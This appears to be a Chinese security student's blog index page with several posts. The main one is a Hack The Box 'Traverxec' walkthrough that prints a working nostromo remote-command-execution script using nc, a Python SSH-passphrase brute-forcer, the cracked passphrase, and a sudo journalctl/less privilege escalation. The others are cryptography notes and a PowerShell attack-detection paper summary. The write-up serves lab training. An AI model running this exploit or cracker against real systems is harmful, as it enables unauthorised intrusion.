@@ -1,0 +1,1507 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"river-li.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="WHU 网络空间安全在读">
+<meta property="og:type" content="website">
+<meta property="og:title" content="River&#39;s blog">
+<meta property="og:url" content="https://river-li.xyz/page/5/index.html">
+<meta property="og:site_name" content="River&#39;s blog">
+<meta property="og:description" content="WHU 网络空间安全在读">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="River Li">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://river-li.xyz/page/5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>River's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">River's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">ロッガ山の骇客君</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/12/03/HTB-Traverxec/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/12/03/HTB-Traverxec/" class="post-title-link" itemprop="url">[HTB]Traverxec</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-03 19:26:15" itemprop="dateCreated datePublished" datetime="2019-12-03T19:26:15+08:00">2019-12-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hack-The-Box/" itemprop="url" rel="index"><span itemprop="name">Hack The Box</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>HackTheBox 上面的一台简单的机器，这是自己第一台拿到权限的active机器，很兴奋</p>
+<p>Happy Hacking</p>
+<!--more--->
+
+<h2 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h2><p>首先nmap扫描发现开了80和22端口</p>
+<p>80端口运行着nostromo服务，并且存在着一个2019年的CVE</p>
+<p>直接使用searchsploit搜索就可以找到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit nostromo</span><br></pre></td></tr></table></figure>
+
+<p>网上也可以搜相关的EXP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HOST=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">PORT=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">shift</span> 2</span><br><span class="line">（<span class="built_in">echo</span> -n -e <span class="string">&#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n&#x27;</span>; \</span><br><span class="line"><span class="built_in">echo</span> -n -e <span class="string">&#x27;Content-Length: 1\r\n\r\necho\necho\n&#x27;</span>; \</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$@</span> 2&gt;&amp;1&quot;</span>) | nc <span class="string">&quot;<span class="variable">$HOST</span>&quot;</span> <span class="string">&quot;<span class="variable">$PORT</span>&quot;</span>\</span><br><span class="line">|sed --quiet --expression <span class="string">&#x27;:S;/^\r$/&#123;n;bP&#125;;n;bS;:P;n;p;bP&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行的时候</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp.sh 10.10.10.165 80 ls /var/nostromo/</span><br></pre></td></tr></table></figure>
+
+<p>这样执行命令，之后就相当于获得到了www-data 的权限</p>
+<p>下面需要提权</p>
+<h2 id="david"><a href="#david" class="headerlink" title="david"></a>david</h2><p>在nostromo的文件夹下看到了一个配置文件夹，里面有nhttpd.conf</p>
+<p>文件的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># MAIN [MANDATORY]</span><br><span class="line"></span><br><span class="line">servername              traverxec.htb</span><br><span class="line">serverlisten            *</span><br><span class="line">serveradmin             david@traverxec.htb</span><br><span class="line">serverroot              &#x2F;var&#x2F;nostromo</span><br><span class="line">servermimes             conf&#x2F;mimes</span><br><span class="line">docroot                 &#x2F;var&#x2F;nostromo&#x2F;htdocs</span><br><span class="line">docindex                index.html</span><br><span class="line"></span><br><span class="line"># LOGS [OPTIONAL]</span><br><span class="line"></span><br><span class="line">logpid                  logs&#x2F;nhttpd.pid</span><br><span class="line"></span><br><span class="line"># SETUID [RECOMMENDED]</span><br><span class="line"></span><br><span class="line">user                    www-data</span><br><span class="line"></span><br><span class="line"># BASIC AUTHENTICATION [OPTIONAL]</span><br><span class="line"></span><br><span class="line">htaccess                .htaccess</span><br><span class="line">htpasswd                &#x2F;var&#x2F;nostromo&#x2F;conf&#x2F;.htpasswd</span><br><span class="line"></span><br><span class="line"># ALIASES [OPTIONAL]</span><br><span class="line"></span><br><span class="line">&#x2F;icons                  &#x2F;var&#x2F;nostromo&#x2F;icons</span><br><span class="line"></span><br><span class="line"># HOMEDIRS [OPTIONAL]</span><br><span class="line"></span><br><span class="line">homedirs                &#x2F;home</span><br><span class="line">homedirs_public         public_www</span><br></pre></td></tr></table></figure>
+
+<p>具体nostromo有一些特性</p>
+<p>在nostromo的man手册中有提到一点，其中的HOMEDIRS下的选项</p>
+<p>有一个功能是可以直接在web中访问到home目录下的用户文件夹</p>
+<p>可以看到配置文件中写道了可以直接访问<code>/home</code>目录</p>
+<p>因此我们在浏览器中直接访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.165:80&#x2F;~david&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>实际上访问的目录就是<code>/home/david</code></p>
+<p>在终端中直接尝试查看这个目录下的内容是看不到的（没有读权限）</p>
+<p>但是看到<code>homedirs_public</code>这个值，这个是任何用户都可以直接访问的</p>
+<p>因此直接在终端中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp.sh 10.10.10.165 80 ls -la /home/david/public_www</span><br></pre></td></tr></table></figure>
+
+<p>在这里面可以找到一个<code>protected-file-area</code></p>
+<p>里面包含了一个<code>tar</code>压缩包</p>
+<p>将这个压缩包解压，里面包含了一个<code>.ssh</code>, 内容为公私钥</p>
+<p>解压这个包的时候使用的命令是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf XXXXX.tar -C /tmp</span><br></pre></td></tr></table></figure>
+
+<p>因为直接解压默认的目录是<code>/home</code>下，这个目录我们是没有权限去写的，因此使用<code>-C</code>可以指定目录</p>
+<p>私钥的内容是加密过的，没有办法直接连接，需要首先破解passphrase</p>
+<p>手动写一个脚本来爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE, Popen</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmdline</span>(<span class="params">command</span>):</span></span><br><span class="line">    proc = subprocess.Popen(str(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    (out, err) = proc.communicate()</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    words = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span>)]</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">        strcmd = <span class="string">&quot;openssl rsa -in ~/.ssh/id_rsa -out out.key -passin pass:&quot;</span>+w</span><br><span class="line">        res=cmdline(strcmd)</span><br><span class="line">        <span class="keyword">if</span> res.startswith(<span class="string">&quot;writing&quot;</span>):</span><br><span class="line">                print(<span class="string">&quot;\nThe key is: &quot;</span>+w)</span><br><span class="line">                sys.exit()</span><br><span class="line">        print(str(count)+<span class="string">&quot;/&quot;</span>+str(w))</span><br><span class="line">        count=count+<span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>就是直接用python对字典中的词进行尝试，破解得到ssh私钥的pass为<code>hunter</code></p>
+<p>下面直接连接，即可获得david的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh david@10.10.10.165</span><br></pre></td></tr></table></figure>
+
+<p>其实也可以使用john来爆破key，首先使用ssh2john将其转换为john可以爆破的内容，之后直接用john和字典就可以</p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>首先做的事情就是查看david的目录下有没有比较有用的内容</p>
+<p>发现david的目录下的结构</p>
+
+
+<p>这个<code>bin</code>目录下的server-status.sh比较有趣</p>
+
+
+<p>运行这个脚本可以看到</p>
+
+
+<p>发现最后一行是使用了<code>sudo</code>运行<code>journalctl</code>这个程序</p>
+<p>但是却没有需要输入david的密码，因此如果可以获得这个程序本身的权限就可以得到root的权限了</p>
+<p>我们仿照脚本里最后一行运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br></pre></td></tr></table></figure>
+
+<p>这样也不需要输入密码，最后也是进入了<code>sudo</code>权限的<code>less</code>中</p>
+<p>在<code>less</code>中可以类似<code>vim</code>那样使用<code>!</code>来执行外部的程序</p>
+
+
+
+
+<p>done!</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下这个靶机中学到的新知识</p>
+<ol>
+<li>nostromo 存在的漏洞</li>
+<li>nostromo存在一个可以直接用web访问到用户文件夹的特性</li>
+<li>journalctl、less的提权方法</li>
+<li>使用脚本爆破ssh加密key的方法</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/12/02/picoCTF2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/12/02/picoCTF2019/" class="post-title-link" itemprop="url">picoCTF2019</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-02 16:25:15" itemprop="dateCreated datePublished" datetime="2019-12-02T16:25:15+08:00">2019-12-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>picoCTF是一个从易到难的ctf平台，题目好像非常多，每道题还有hint；ctf题目的各个层面内容都包含，最近按着顺序在做题，记录一下遇到过的比较有价值的题目。</p>
+<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/11/29/Cryptography/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/11/29/Cryptography/" class="post-title-link" itemprop="url">Cryptography</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-29 16:09:22" itemprop="dateCreated datePublished" datetime="2019-11-29T16:09:22+08:00">2019-11-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>内容来源于picoctf，其中的补充知识资料</p>
+<p><a href="picoctf.com/learning_guides/Book-2-Cryptography.pdf">原始资料链接</a></p>
+<!--more--->
+
+
+<h2 id="Example-Ciphers"><a href="#Example-Ciphers" class="headerlink" title="Example Ciphers"></a>Example Ciphers</h2><ol>
+<li>Caesar Cipher</li>
+<li>Affine Cipher</li>
+<li>Vigenere Cipher</li>
+<li>Hill Cipher</li>
+</ol>
+<h4 id="Caesar-Cipher"><a href="#Caesar-Cipher" class="headerlink" title="Caesar Cipher"></a>Caesar Cipher</h4><p>即凯撒密码，选择一个0-25的数字作为key，之后将plaintext的每一个字符向前或向后移动key位，得到的为ciphertext</p>
+<p>这种密码非常容易破解，只需要列出26个字符串找出其中有意义的那个即可</p>
+<h4 id="Affine-Cipher"><a href="#Affine-Cipher" class="headerlink" title="Affine Cipher"></a>Affine Cipher</h4><p>仿射密码，是凯撒密码的一般性密码；</p>
+<p>首先将字母全部转换为数字，之后用一个线性的函数对其处理，得到的数字再转换为字母；<br>$$<br>y=a * x+b<br>$$<br>凯撒密码是系数为1时的情况；</p>
+<h4 id="Vigenere-Cipher"><a href="#Vigenere-Cipher" class="headerlink" title="Vigenere Cipher"></a>Vigenere Cipher</h4><p>维吉尼亚密码</p>
+<p>虽然也是一个置换密码，但是移动的位数是一个随key的每个字符变化的数；</p>
+<p>一般变化方式是通过字母变换的表格，如图所示</p>
+
+
+
+
+<h4 id="Hill-Cipher"><a href="#Hill-Cipher" class="headerlink" title="Hill Cipher"></a>Hill Cipher</h4><p>希尔密码；</p>
+<p>首先将包含n个字母长的信息写成具有n个元素的列向量，向量的每一个元素是一个数字，代表相应的字母；</p>
+<p>密钥key是一个 n*n的随机数矩阵；</p>
+<p>将密钥矩阵和原始信息相乘再每一个元素模26，最后将得到的向量转化成字母即为密文。</p>
+<p>解密的过程与之类似，只是矩阵的左右乘需要改变一下</p>
+<h2 id="Hashing"><a href="#Hashing" class="headerlink" title="Hashing"></a>Hashing</h2><p>一个好的哈希函数需要满足的几个特点：</p>
+<ol>
+<li>给定一个输入，易于计算哈希值</li>
+<li>给定一个哈希值，很难计算出原本的输入值</li>
+<li>无碰撞，不应该存在两个具有相同哈希的数</li>
+</ol>
+<h2 id="Cipher-Attack"><a href="#Cipher-Attack" class="headerlink" title="Cipher Attack"></a>Cipher Attack</h2><p>对于凯撒密码，可以使用Frequency Analysis分析字母出现的频率，英文单词中各个字母出现的频率一般是固定的</p>
+<p>对于维吉尼亚密码，如果知道密钥的长度就会容易许多，而猜测密钥的长度就因此是一个很关键的步骤；有两个猜想，<em>The Kasiki Test</em> 和 <em>The Friedman Test</em>；如果一个字符串足够长，就有很大的可能包含了重复的key；假设一个密文中有重复加密的key，则可以对其间隔进行分组，每一组相当于都是凯撒密码，对其进行频率分析得到一个可能的key</p>
+<p>对于DH密钥交换的攻击，<u>Man In The Middle Attack</u>，中间人攻击，在协商对称密钥时中间人拦截消息后和双方分别协商会话密钥</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/10/08/Powershell-Scripts-Detection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/10/08/Powershell-Scripts-Detection/" class="post-title-link" itemprop="url">Powershell-Scripts-Detection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-08 15:16:06" itemprop="dateCreated datePublished" datetime="2019-10-08T15:16:06+08:00">2019-10-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Paper/" itemprop="url" rel="index"><span itemprop="name">Paper</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Semantic-Aware-Attack-Detection-for-PowerShell-Scripts"><a href="#Semantic-Aware-Attack-Detection-for-PowerShell-Scripts" class="headerlink" title="Semantic-Aware Attack Detection for PowerShell Scripts"></a>Semantic-Aware Attack Detection for PowerShell Scripts</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>近年来PowerShell脚本在APT、勒索软件、钓鱼邮件等攻击中出现的频率越来越高，然而PowerShell脚本的语言从设计时就是动态的并能够以不同级别组建脚本，基于state-of-the-art的静态分析PowerShell攻击检测天然的易受攻击混淆。</p>
+<p>文中为了解决该问题设计了第一个高效轻量的反混淆方式。文中设计了一种新奇的基于子树的反混淆方法用于检测混淆和PowerShell抽象语法树子树层面的基于模拟的恢复技术。</p>
+<p>基于上面的反混淆方法，可以进一步设计第一个于一层面的PowerShell脚本攻击检测系统。文中改变了传统的面向对象的关联挖掘算法并针对PowerShell脚本攻击识别新提出了31中语义上的签名。</p>
+<!--more--->
+
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>由于powershell在攻击中具有无文件、Windows预装等优势，越来越多的攻击都开始使用Powershell脚本。</p>
+<p>为了检测相应的攻击，先前曾有人提出过state-of-the-art攻击检测系统，这个系统是使用静态分析匹配字符串级别的签名实现的。虽然静态分析确实更高效，覆盖代码范围更广，但是PowerShell本身的动态性特点使得运行过程中可以不同层面的产生脚本片段，这就使得静态分析的方式容易被绕过。</p>
+<p>论文中首先有一个核心观点：**<em>企图绕过检测系统的脚本片段在运行时需要能恢复为原本的整个脚本**</em>，因此，针对这些存在混淆绕过技术的脚本，只要能够定位到脚本的片段就能够模拟每一段的执行并逐步重建完整的脚本。</p>
+<p>然而问题在于如何精准的识别标识出这些片段，文中称之为<em>recoverable script pieces</em>, 如果对这些片段的检测不够精准可能最终得到的结果就是代码片段运行后的结果或是中间结果而非原脚本。</p>
+<p>为了解决这一问题，文中提出了一个新颖的方法：基于子树的反混淆方案，这一方案的检测运行在PowerShell的抽象语法树的子树层面，而这是PowerShell脚本混淆方法的基本单元。</p>
+<p>由于一个几KB的脚本的AST就会有几千个子树，为了实现高效的反混淆文中设计了一个机器学习的分类器来首先对子树进行初步分类判别是否是混淆了的。针对混淆过的脚本在子树中使用自底向上的方式来标识可恢复的脚本片段并模拟恢复其逻辑。</p>
+<p>进一步构建系统的过程文中用到了OOA算法，这个算法可以自动提取出最常出现的命令和函数集合，成为OOA rules，并将其作为语义特征进行匹配，作者对大量脚本处理后新定义了31个rules作为PowerShell攻击的Signature</p>
+<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Powershell脚本在攻击中常用下载、执行payload、建立反弹shell、收集信息等</p>
+<h3 id="“Living-off-the-land”和无文件攻击"><a href="#“Living-off-the-land”和无文件攻击" class="headerlink" title="“Living off the land”和无文件攻击"></a>“Living off the land”和无文件攻击</h3><p>前者指尽量少释放文件，而使用系统自身的攻击实现的攻击</p>
+<p>后者则是不会在硬盘上留下文件痕迹的攻击</p>
+<p>PowerShell作为以上两种攻击的好处在于：</p>
+<ol>
+<li>Windows自带</li>
+<li>能够轻易的访问绝大多数Windows组件并可以直接以管理员权限执行</li>
+<li>可以直接在内存中执行而不需要在硬盘上留下大量的文件，这样可以绕过许多传统的检测文件释放的检测系统</li>
+</ol>
+<h3 id="PowerShell脚本的混淆技术"><a href="#PowerShell脚本的混淆技术" class="headerlink" title="PowerShell脚本的混淆技术"></a>PowerShell脚本的混淆技术</h3><p>传统编程语言的混淆技术主要是逻辑结构上的，然而在PowerShell中数据和代码没有明确的界限，因此大多数混淆技术可以总结为两个步骤：</p>
+<ul>
+<li>计算字符串，转换为代码</li>
+<li>重新组合代码执行</li>
+</ul>
+<p>一些常见的技术有以下内容</p>
+<h4 id="随机化"><a href="#随机化" class="headerlink" title="随机化"></a>随机化</h4><p>随机化主要是对代码作一些随机改变，这些对代码的执行不起影响。</p>
+<p>主要有：</p>
+<ul>
+<li>空格随机化</li>
+<li>大小写随机化</li>
+<li>变量函数名随机化</li>
+<li>随机插入会被PowerShell忽略的字符</li>
+</ul>
+<p>还有一些如使用别名而不是完整的命令等</p>
